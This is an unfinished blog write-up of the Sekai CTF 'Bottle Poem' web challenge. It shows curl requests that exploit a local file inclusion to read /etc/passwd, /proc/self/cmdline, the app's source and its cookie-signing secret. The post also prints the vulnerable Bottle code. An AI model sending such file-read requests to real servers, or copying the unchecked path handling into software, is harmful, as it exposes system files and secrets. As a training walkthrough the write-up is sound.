---
title: Sekai CTF - Bottle Poem
layout: post
date: 2022-10-12 20:23:00
tags:
    - ctf, sekaiCTF
---

##### Problem Statement

Come and read poems in the bottle.

No bruteforcing is required to solve this challenge. Please do not use scanner tools. Rate limiting is applied. Flag is executable on server.

Author: bwjy

[Webpage: http://bottle-poem.ctf.sekai.team](http://bottle-poem.ctf.sekai.team)

---

In this challenge we are greeted with 3 links, as we click on them we notice the URL changes. Respectively ~

```
http://bottle-poem.ctf.sekai.team/show?id=spring.txt
http://bottle-poem.ctf.sekai.team/show?id=Auguries_of_Innocence.txt
http://bottle-poem.ctf.sekai.team/show?id=The_tiger.txt
```

Something fishy about this is that it indicates quite possibly the filepath?
Let's try to print something out

We can send a get request to the server using the terminal with `curl`
`curl http://bottle-poem.ctf.sekai.team/show?id=/etc/passwd`
We use `/etc/passwd` since most servers are on linux, and this file will always exist.

Sure enough, it's a [Local File Inclusion](https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

This proves we can read the files on this server. Now the question is, what file do we need to read to get the flag?
https://www.tecmint.com/exploring-proc-file-system-in-linux/

`/proc` directory is a psuedo directory, but it exists because everything is a file on linux.

`/proc/self` is When a process accesses this magic symbolic link, it
resolves to the process's own /proc/[pid] directory.

`/proc/[pid]/cmdline`
This read-only file holds the complete command line for
the process, unless the process is a zombie. In the
latter case, there is nothing in this file: that is, a
read on this file will return 0 characters. The command-
line arguments appear in this file as a set of strings
separated by null bytes ('\0'), with a further null byte
after the last string.

Let's try reading this
`curl http://bottle-poem.ctf.sekai.team/show\?id\=/proc/self/cmdline -o result.txt`
Here we are outputting the result into `result.txt` checking this file we see
`python3-u/app/app.py`

Now we have an entry point to work with! Let's open it up

`curl http://bottle-poem.ctf.sekai.team/show\?id\=/app/app.py -o app.py`

```py
from bottle import route, run, template, request, response, error
from config.secret import sekai
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)
```

Key thing to note here are the routes! The poems are handled under `/show` but there's also `/sign`. Visiting this on the webpages brings this
![image](https://files.catbox.moe/8ylti8.png)

Looking closely at the imports we can infer the next filepath to explore.

`curl http://bottle-poem.ctf.sekai.team/show\?id\=/app/config/secret.py`
`sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"`
Okay seems like we are getting somewhere. However that's where my knowledge depths take a stop. I'll update this blog later when I make some progress
